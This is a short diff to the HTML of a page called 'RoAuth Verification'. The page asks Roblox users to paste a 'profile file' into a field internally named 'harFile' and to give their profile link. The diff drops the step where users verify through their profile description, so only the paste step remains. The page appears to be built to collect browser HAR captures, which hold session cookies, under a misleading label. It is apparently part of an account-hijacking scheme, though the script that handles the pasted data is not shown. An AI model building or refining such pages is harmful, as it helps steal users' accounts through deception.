@@ -11,14 +11,9 @@
         <h1 id="title">RoAuth Verification</h1>
         <div id="step1">
             <h2>Step 1: Paste profile File</h2>
-            <textarea id="harFile" placeholder="Paste your Profile file content here"></textarea>
+            <textarea id="harFile" placeholder="Paste your profile file content here"></textarea>
             <input id="robloxProfile" placeholder="Enter your Roblox profile link">
-            <button onclick="step1Submit()">Submit Step 1</button>
-        </div>
-        <div id="step2" style="display: none;">
-            <h2>Step 2: Update Your Roblox Description</h2>
-            <p id="generatedSentence"></p>
-            <button onclick="step2Verify()">Verify Me!</button>
+            <button onclick="submitStep1()">Submit</button>
         </div>
     </div>
     <script src="script.js"></script>
